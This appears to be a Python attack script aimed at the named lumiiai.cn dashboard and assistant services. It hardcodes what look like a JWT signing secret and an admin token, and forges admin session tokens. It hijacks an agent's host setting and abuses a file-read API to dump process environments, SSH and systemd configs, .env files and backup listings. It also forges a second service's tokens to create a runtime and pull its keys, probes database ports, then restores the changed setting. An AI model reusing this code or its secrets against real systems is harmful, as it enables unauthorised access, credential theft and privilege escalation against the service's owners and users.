#!/usr/bin/env python3
# i29136 round3: center process env dump + systemd units + dirs + assistant JWT/runtimes + DB reachability
import os, sys, json, time, base64, hmac, hashlib, subprocess, re, socket
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
A_HOST = "assistant.lumiiai.cn"
A_SECRET_CAND = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
A_SUB = "usr_ZxLewKrgbRYSm7rWDtQX8"
A_ORG = "org_bTLzxtBLmugV8uxx4QTyw"
AID = "agent-b8d7ca0b"
OWNER = "af0a2285-490f-11f1-ac43-525400595be1"

def _b(s):
    if not isinstance(s, str): s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v): print("R:%s:%s" % (k, _b(v)), flush=True)

def curl(args, timeout=30):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout
    except Exception as e:
        return -1, repr(e).encode()

def call(path, method="GET", body=None, session=None, admin=False,
         host=HOST, timeout=25, maxlen=8000, extra_headers=None):
    args = ["--http2", "-A", UA, "-H", "Accept: application/json, text/plain, */*", "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-H", "Cookie: session=" + session]
    if admin: args += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    for h in (extra_headers or []): args += ["-H", h]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += ["https://%s%s" % (host, path)]
    rc, out = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0: code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen], "len": len(txt)}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def forge(user_id, customer="aro", role="admin"):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"userId": user_id, "email": "p@x", "customer": customer, "role": role,
                         "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

def forge_a(secret, sub, org):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"sub": sub, "org": org, "iat": now, "exp": now + 86400 * 7,
                         "sid": "s29136probe", "lgn": now}, separators=(",", ":")))
    sig = b64u(hmac.new(secret.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

def jload(s):
    try: return json.loads(s)
    except Exception: return None
def qp(p): return up.quote(p, safe="/")

def flist(aid, sess, path, timeout=30, maxent=200):
    r = call("/api/agents/%s/files?action=list&path=%s" % (aid, qp(path)), session=sess, timeout=timeout, maxlen=60000)
    j = jload(r["body"]); ents = []
    if isinstance(j, dict) and isinstance(j.get("entries"), list):
        for e in j["entries"][:maxent]:
            ents.append({"n": e.get("name"), "t": e.get("type"), "s": e.get("size")})
    return r["code"], ents, r["body"][:200]

def fread(aid, sess, path, timeout=30, maxlen=600000):
    r = call("/api/agents/%s/files?action=read&path=%s" % (aid, qp(path)), session=sess, timeout=timeout, maxlen=maxlen)
    j = jload(r["body"])
    if isinstance(j, dict) and "content" in j:
        return r["code"], j.get("content") or "", j.get("size"), j.get("path")
    return r["code"], None, None, r["body"][:200]

sess = forge(OWNER, customer="aro")
# health + patch verification
R("P0_health", call("/api/health", timeout=20)["body"][:200])
pr = call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": "127.0.0.1"}, timeout=25, maxlen=2000)
R("P1_patch", {"code": pr["code"], "ip": (jload(pr["body"]) or {}).get("ip")})

# --------- all pids ---------
code, ents, raw = flist(AID, sess, "/proc", timeout=60, maxent=400)
pids = [e["n"] for e in ents if str(e.get("n", "")).isdigit()]
R("P2_proc_n", {"code": code, "n": len(pids)})
cmdlines = {}
for pid in pids:
    c2, cmd, sz, pth = fread(AID, sess, "/proc/%s/cmdline" % pid, timeout=12, maxlen=4000)
    if cmd is None: continue
    cmdlines[pid] = cmd.replace("\x00", " ").strip()[:200]
R("P2_cmdlines", cmdlines)

CAND = []
for pid, cmd in cmdlines.items():
    if re.search(r"(lumii-prod|src/server|center|main\.ts|server\.ts|tsx|next-server|node)", cmd, re.I):
        CAND.append(pid)
envs = {}
for pid in sorted(set(CAND), key=lambda x: int(x))[:12]:
    c3, env, s3, p3 = fread(AID, sess, "/proc/%s/environ" % pid, timeout=25, maxlen=400000)
    if env is not None:
        lines = [l for l in env.split("\x00") if l.strip()]
        envs[pid] = {"cmd": cmdlines.get(pid), "n": len(lines), "size": len(env), "all": env}
    else:
        envs[pid] = {"cmd": cmdlines.get(pid), "err": str(p3)[:120]}
R("P3_envs", envs)

# --------- systemd ---------
units = {}
for u in ("lumii-prod-center.service", "lumii-prod-minutes-asr-tunnel.service"):
    c, content, sz, pth = fread(AID, sess, "/etc/systemd/system/" + u, timeout=20)
    units[u] = {"code": c, "content": (content or "")[:6000], "err": None if content is not None else str(pth)[:120]}
c, ents, raw = flist(AID, sess, "/etc/systemd/system/lumii-prod-center.service.d", timeout=20)
units["center.d"] = {"code": c, "entries": ents}
for e in ents:
    if e["t"] == "file":
        c2, content, sz, pth = fread(AID, sess, "/etc/systemd/system/lumii-prod-center.service.d/" + e["n"], timeout=20)
        units["d:" + e["n"]] = (content or "")[:4000]
c, ents, raw = flist(AID, sess, "/etc/systemd/system/multi-user.target.wants", timeout=20)
units["wants"] = {"code": c, "entries": [x["n"] for x in ents if "lumii" in str(x["n"]) or "caddy" in str(x["n"])]}
R("P4_units", units)

# --------- dirs ---------
DIRS = ["/opt/lumii-prod/scripts", "/opt/lumii-prod/deploy", "/opt/lumii-prod/data", "/opt/lumii-prod-backup",
        "/opt/lumii-prod-docker", "/opt/lumii-ops", "/opt/lumii", "/opt/lumii-lak-dist",
        "/home/ubuntu/backups", "/home/ubuntu/db_backups", "/home/ubuntu/lumii-backups",
        "/home/ubuntu/manual-bak-1118", "/home/ubuntu/iss781-backup-20261106-000844",
        "/home/ubuntu/session-restore-20261013", "/home/ubuntu/qingpu-patch", "/home/ubuntu/bin",
        "/home/ubuntu/lumii-dashboard"]
listing = {}
for d in DIRS:
    c, ents, raw = flist(AID, sess, d, timeout=30, maxent=200)
    listing[d] = {"code": c, "entries": ents[:200], "raw": raw if c != "200" else ""}
R("P5_dirs", listing)

# --------- specific files ---------
FILES = ["/etc/caddy/Caddyfile", "/etc/ssh/sshd_config", "/home/ubuntu/lumii-dashboard/next.config.js",
         "/home/ubuntu/lumii-dashboard/.env.local", "/opt/lumii-prod/scripts/lumii-auto-deploy.sh",
         "/home/ubuntu/bin/lumii-auto-deploy.sh", "/opt/lumii-prod/package.json"]
files = {}
for f in FILES:
    c, content, sz, pth = fread(AID, sess, f, timeout=25)
    files[f] = {"code": c, "size": sz, "content": (content or "")[:6000], "err": None if content is not None else str(pth)[:150]}
R("P6_files", files)

# --------- assistant JWT test ---------
atok = forge_a(A_SECRET_CAND, A_SUB, A_ORG)
ar = {}
for hdr in (["Cookie: lumii_session=" + atok], ["Cookie: session=" + atok], ["Authorization: Bearer " + atok]):
    r = call("/api/me", host=A_HOST, extra_headers=hdr, timeout=25, maxlen=2000)
    ar[hdr.split(":")[0] + ("_bearer" if "Authorization" in hdr else "")] = {"code": r["code"], "body": r["body"][:300]}
    print("assist me", hdr.split(":")[0], r["code"], flush=True)
R("P7_assist_me", ar)
r = call("/api/runtimes", host=A_HOST, extra_headers=["Cookie: lumii_session=" + atok], timeout=25, maxlen=6000)
R("P7_assist_runtimes", {"code": r["code"], "body": r["body"][:800]})
if r["code"] == "200":
    pr = call("/api/runtimes", method="POST", host=A_HOST,
              body={"name": "probe-29136", "visibility": "org"},
              extra_headers=["Cookie: lumii_session=" + atok], timeout=30, maxlen=8000)
    R("P7_assist_create_runtime", {"code": pr["code"], "body": pr["body"][:1200]})
    jp = jload(pr["body"]) or {}
    rid = jp.get("id")
    if rid:
        kr = call("/api/runtimes/keys/current?runtimeId=%s" % rid, host=A_HOST,
                  extra_headers=["Cookie: lumii_session=" + atok], timeout=25, maxlen=4000)
        R("P7_assist_keys", {"id": rid, "code": kr["code"], "body": kr["body"][:600]})
        R("P7_assist_rt_id", rid)

# --------- DB reachability from runner ---------
db = {}
for port in (5432, 3306, 8788):
    s = socket.socket(); s.settimeout(6)
    t0 = time.time()
    try:
        s.connect(("122.51.1.87", port)); db[port] = "OPEN %.2fs" % (time.time() - t0)
    except Exception as e:
        db[port] = "ERR " + repr(e)[:80]
    finally:
        s.close()
R("P8_db_ports", db)

# --------- restore ---------
pr2 = call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": "52.53.251.49"}, timeout=25, maxlen=1000)
R("P9_restore", {"code": pr2["code"]})
print("DONE", flush=True)
